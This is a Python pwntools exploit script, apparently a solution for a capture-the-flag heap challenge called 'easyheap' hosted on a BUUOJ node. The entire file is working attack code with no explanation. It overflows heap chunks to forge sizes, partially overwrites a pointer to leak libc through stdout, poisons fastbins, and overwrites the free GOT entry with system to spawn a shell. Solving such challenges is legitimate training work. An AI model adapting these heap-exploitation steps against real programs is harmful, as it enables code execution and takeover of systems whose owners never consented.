import sys
from pwn import *
context.log_level='debug'
#context.arch='amd64'
while True :
	try :
		if len(sys.argv)==1 :
			io=process('./easyheap')
			# io=process(['./'],env={'LD_PRELOAD':'./'})
			elf=ELF('./easyheap')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
		else :
			io=remote('node3.buuoj.cn',28340)
			elf=ELF('./easyheap')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')

		def add(a,b):
			io.sendlineafter('Your choice :','1')
			io.sendlineafter('Size of Heap : ',str(a))
			io.sendafter('Content of heap:',b)

		def delete(a):
			io.sendlineafter('Your choice :','3')
			io.sendlineafter('Index :',str(a))
			
		def edit(a,b,c):
			io.sendlineafter('Your choice :','2')
			io.sendlineafter('Index :',str(a))
			io.sendlineafter('Size of Heap : ',str(b))
			io.sendafter('Content of heap : ',c)

		add(0x68,'/bin/sh\x00')
		add(0x88,'aaa')
		add(0x68,'aaa')
		add(0x40,'/bin/sh\x00')
		edit(0,0x90,'\x00'*0x68+p64(0x101)+'\xdd\x55')
		delete(1)
		delete(2)
		add(0x88,'aaa')
		edit(1,0xf0,'\x00'*0x88+p64(0x71)+'\xdd\x55')
		add(0x68,'aaa')
		add(0x68,'aaa'+p64(0)*6+p64(0x1800)+p64(0)*3+'\x88')
		libc_base=u64(io.recv(8))-libc.sym['_IO_2_1_stdin_']
		libc.address=libc_base
		delete(2)
		edit(1,0xf0,'\x00'*0x88+p64(0x71)+p64(0x6020b0-3))
		add(0x68,'aaaaa')
		add(0x68,'a'*0x13+p64(libc_base+0xf1147)+p64(libc_base+0x4526a)+p64(elf.got['free']))
		edit(0,0x8,p64(elf.plt['system']))
		

		#success('heap_base:'+hex(heap_base))
		success('libc_base:'+hex(libc_base))

		#gdb.attach(io)
		#pause()

	except Exception as e:
		io.close()
		continue
	else:
		io.interactive()